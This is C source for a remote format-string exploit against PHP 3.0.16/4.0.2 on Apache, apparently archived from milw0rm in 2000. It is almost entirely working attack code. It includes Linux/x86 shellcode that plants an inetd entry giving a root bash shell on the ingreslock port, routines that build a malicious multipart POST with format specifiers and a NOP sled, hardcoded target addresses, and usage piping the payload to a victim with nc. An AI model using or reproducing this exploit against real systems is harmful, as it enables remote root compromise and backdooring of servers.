/* 
 * PHP 3.0.16/4.0.2 remote format overflow exploit.
 * Copyright (c) 2000 
 * Field Marshal Count August Anton Wilhelm Neithardt von Gneisenau
 * gneisenau@berlin.com
 * my regards to sheib and darkx
 * All rights reserved
 * Pascal Boucheraine's paper was enlightening
 * THERE IS NO IMPLIED OR EXPRESS WARRANTY FOR THIS CODE. 
 * YOU ARE RESPONSIBLE FOR YOUR OWN ACTIONS AND I CANNOT BE HELD RESPONSIBLE
 * FOR THE CONSEQUENCES
 * Usage:
 * phpxpl -sx -uwww.victim.com/some.php3 | nc www.victim.com 80
 *
 * Slackware 7.0: eip address/shellcode address
 *                 0xbfff9b90/0xbfff958c
 *
 */
/*
 * We just printf the shellcode and stuff and nc it to the target
 */

#include <sys/types.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// this exploit does not like 0x0a = '\n' in the shellcode. also the NULL at
// the end of the shellcode will be removed as the shellcode is probably
// strcatted into the buffer. so do it again in the shellcode. 
/*
 * This shellcode is for Linux/x86. 
 * This shellcode spawns a shell and runs the command
 * echo 'ingreslock stream tcp nowait root /bin/bash bash -i'>/tmp/.inetd.conf; /usr/sbin/inetd /tmp/.inetd.conf
 */
char shellcode[] = {
  0xeb,0x41,						
  0x5e, 						   
  0x31,0xc0,						
  0x31,0xdb,						
  0xb0,0xa0,						
  0x89,0x34,0x06,				
  0x8d,0x4e,0x07,				
  0x88,0x19,						
  0x41,								
  0x41,								
  0xb0,0xa4,						
  0x89,0x0c,0x06,				
  0x8d,0x4e,0x0b,				
  0x88,0x19,					
  0x41,								
  0xb0,0xa8,						
  0x89,0x0c,0x06,			
  0x8d,0x4e,0x7f,				
  0x88,0x19,						
  0x31,0xd2,						
  0xb0,0xac,						
  0x89,0x14,0x06,				
  0x89,0xf3,						
  0x89,0xf1,						
  0xb0,0xa0,					
  0x01,0xc1,						
  0xb0,0x0b,						
  0xcd,0x80,						
  0x31,0xc0,					
  0xb0,0x01,					
  0x31,0xdb,						
  0xcd,0x80,						
  0xe8,0xba,0xff,0xff,0xff,  
  0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0xff,0xff, /* the string "/bin/sh" */ 
  0x2d,0x63,0xff,						/* the string "-c"	*/
  0x2f,0x62,0x69,0x6e,0x2f,0x65,0x63,0x68,0x6f,0x20,0x27,0x69,
  0x6e,0x67,0x72,0x65,0x73,0x6c,0x6f,0x63,0x6b,0x20,0x73,0x74,
  0x72,0x65,0x61,0x6d,0x20,0x74,0x63,0x70,0x20,0x6e,0x6f,0x77,
  0x61,0x69,0x74,0x20,0x72,0x6f,0x6f,0x74,0x20,0x2f,0x62,0x69,
  0x6e,0x2f,0x62,0x61,0x73,0x68,0x20,0x62,0x61,0x73,0x68,0x20,
  0x20,0x2d,0x69,0x27,0x3e,0x2f,0x74,0x6d,0x70,0x2f,0x2e,0x69,
  0x6e,0x65,0x74,0x64,0x2e,0x63,0x6f,0x6e,0x66,0x3b,0x20,0x2f,
  0x75,0x73,0x72,0x2f,0x73,0x62,0x69,0x6e,0x2f,0x69,0x6e,0x65,
  0x74,0x64,0x20,0x2f,0x74,0x6d,0x70,0x2f,0x2e,0x69,0x6e,0x65,
  0x74,0x64,0x2e,0x63,0x6f,0x6e,0x66,0x00,
};

#define NOP 0x90


/*
 * the PHP3 error buffer will already contain PHP 3 Warning: The Content-Type
 * string was "multipart/form-data. This is 66 bytes long. we send 2 spaces
 * for padding the addresses we embed in our attack buffer on word boundary
 */
#define PHP3_WARNING 68
#define BUF_LEN 1024

struct system_type {
	char *name;
	unsigned int nop;
	char *shellcode;
	int	shellcode_len;
	int	offset;			/* the number of pops we need to get to our own data*/
	int	already_written;	/* number of bytes written by printf by the time we reach the our embedded data */
	unsigned int	eip_address; /* address where shellcode_address must be put */
	unsigned int	shellcode_address; /* address of shellcode in memory */
};

struct system_type systems[] = {
		{
			"Slackware Linux 7.0 - i386/Apache 1.3.12/PHP 3.0.16 (static module)",
			0x90,
			shellcode,
			270,	/* not exact but we got lots of space ;) */
			27,
			0x152,
			0xbfff9c30,
			0xbfff962c,
		},
		// somebody find these and fill it in please. should be 
		// straightforward.
		{
			"Red Hat 6.0 - i386/Apache 1.3.13/PHP 3.0.16 (static module)",
			(unsigned int)NULL,
			NULL,
			(int)NULL,
			(int)NULL,
			(int)NULL,
			(unsigned int)NULL,
			(unsigned int)NULL,
		},
		{
			NULL,
			(unsigned int)NULL,
			NULL,
			(int)NULL,
			(int)NULL,
			(int)NULL,
			(unsigned int)NULL,
			(unsigned int)NULL,
		},
};

void 	usage (void);
void 	parse_url (char *, char *);
void 	prepare_attack_buffer (char *, struct system_type *, char *);
int	calculate_precision (unsigned int, int);

int
main (int argc, char *argv[])
{
	char 	attack_buffer[2000];	// we construct the shellcode and stuff here
										// the target is 1024 bytes long
	struct system_type *sysptr;
	char  *url; 				// i hope these things dont get bigger than this
	char  target[2048];			// target will contain only the FQDN
	unsigned int eip_address = 0, shellcode_address = 0;
	int	ctr = 0;
	int	nop_count;
	char  *walk;
	int	arg;					 		

	// at least expect a system type and url from the command line
	if (argc < 3)
		usage ();

	// parse arguments
	while ((arg = getopt (argc, argv, "s:u:e:h:")) != -1){
		switch (arg){
			case 'h':
						sscanf (optarg, "%x", &shellcode_address);
						break;
			case 'e':
						sscanf (optarg, "%x", &eip_address);
						break;
			case 's':	
						sysptr = &systems[atoi (optarg)];
						break;
			case 'u':
						url = optarg;
						parse_url (url, target);
						break;
			case '?':
			default :	
						usage ();
		}
	}

	if (eip_address)
		sysptr->eip_address = eip_address;
	if (shellcode_address)
		sysptr->shellcode_address = shellcode_address;
	prepare_attack_buffer (attack_buffer, sysptr, url);

	// as of now write it out to stdout. later write it to a socket
	write (STDOUT_FILENO, attack_buffer, sizeof (attack_buffer));
}

void
prepare_attack_buffer (char *attack_buffer, struct system_type *system, 
								char *url)
{
	int	dest_buffer_written;		/* we keep track of how much bytes will be written in the destination buffer */
	int 	ctr;
	char	*address;
	char	buf[25];						// temp buffer for %xd%n%xd%n%xd%n%xd%n
											// where x is precision
	int 	p1,p2,p3,p4;
	int	nop_count;

	bzero (attack_buffer, 2000);
	sprintf (attack_buffer, "POST http://%s HTTP/1.0\nConnection: close\nUser-Agent: tirpitz\nContent-Type: multipart/form-data   ", url);
	// mark strlen here. whatever we write after here appears in the buffer
	dest_buffer_written = strlen (attack_buffer);

	strcat (attack_buffer, "\x11\x11\x11\x11");
	address = (char *)&system->eip_address;
	strncat (attack_buffer, address, 4);
	strcat (attack_buffer, "\x11\x11\x11\x11");
	system->eip_address++;
	address = (char *)&system->eip_address;
	strncat (attack_buffer, address, 4);
	strcat (attack_buffer, "\x11\x11\x11\x11");
	system->eip_address++;
	address = (char *)&system->eip_address;
	strncat (attack_buffer, address, 4);
	strcat (attack_buffer, "\x11\x11\x11\x11");
	system->eip_address++;
	address = (char *)&system->eip_address;
	strncat (attack_buffer, address, 4);

	/*
	 * we need to add %x corresponding to the number of pops we need to reach
	 * our embedded addresses we defined above
	 */
	for (; system->offset; system->offset--)
		strcat (attack_buffer, "%x ");

	p1 = calculate_precision ((system->shellcode_address & 0x000000ff), system->already_written);
	p2 = calculate_precision ((system->shellcode_address & 0x0000ff00) >> 8, system->already_written);
	p3 = calculate_precision ((system->shellcode_address & 0x00ff0000) >> 16, system->already_written);
	p4 = calculate_precision ((system->shellcode_address & 0xff000000) >> 24, system->already_written);
	sprintf (buf, "%%%dd%%n%%%dd%%n%%%dd%%n%%%dd%%n", p1, p2, p3, p4);
	strcat (attack_buffer, buf);

	ctr = strlen (attack_buffer); 
	dest_buffer_written = ctr - dest_buffer_written;
	dest_buffer_written += PHP3_WARNING; // dest_buffer_written now contains the number of bytes the PHP_WARNING and then the 8 4 byte values and then the %x to pop off the stack
	attack_buffer += ctr;
	nop_count = BUF_LEN - dest_buffer_written - system->shellcode_len;
	memset (attack_buffer, NOP, nop_count);
	/*
	 * Add our shellcode at last
	 */
	attack_buffer += nop_count;
	strcat (attack_buffer, shellcode);
	strcat (attack_buffer, "\n");
	strcat (attack_buffer, "Content-Length: 1337\n\n");
}

void
usage (void)
{
	int 	ctr;

	fprintf (stderr, "                                 Apache/PHP xploit\n");
	fprintf (stderr, "        Field Marshal Count August Anton Wilhelm Neithardt von Gneisenau\n");
	fprintf (stderr, "                                 for the r00tcrew\n");
	fprintf (stderr, "                                All rights reserved\n");
	fprintf (stderr, "\nUsage:\n");
	fprintf (stderr, "phpxpl -u url -s systype [ -e eip address ] [ -h shellcode address ]\n\n"); 
	fprintf (stderr, "url: the complete url including FQDN and script on the server\n");
	fprintf (stderr, "      www.victim.com/info.php3\n");
	fprintf (stderr, "available systypes:\n");

	for (ctr = 0; systems[ctr].name; ctr++)
		fprintf (stderr, "%d. %s\n", ctr, systems[ctr].name);
	fprintf (stderr, "eip address: the address which the xploit overwrites with buffer address (specify thus 0xbfff9c30) \n");
	fprintf (stderr, "shellcode address: the address which points to the NOPs (specify thus 0xbfff962c)\n");
	fprintf (stderr, "\n");
	exit (1);
}

void
parse_url (char *url, char *target)
{
	char *ptr;

	strcpy (target, url);
	if (!(ptr = index (target, '/'))){
		fprintf (stderr, "invalid url. specify the script name on the target server too\n");
		exit (1);
	}
	*ptr = '\0';
}

/*
 * addr_byte contains the byte we need to write out. for example: 2c in
 * 0xbfff962c, then 96, ff and bf. 
 */
int
calculate_precision (unsigned int addr_byte, int already_written_init)
{
	static int already_written = 0;
	int	tmp;

	if (!already_written)
		already_written = already_written_init;

	while (addr_byte < already_written)
		addr_byte += 0x100;

	tmp = addr_byte - already_written;
	already_written = addr_byte;
	return tmp;
}


// milw0rm.com [2000-12-06]
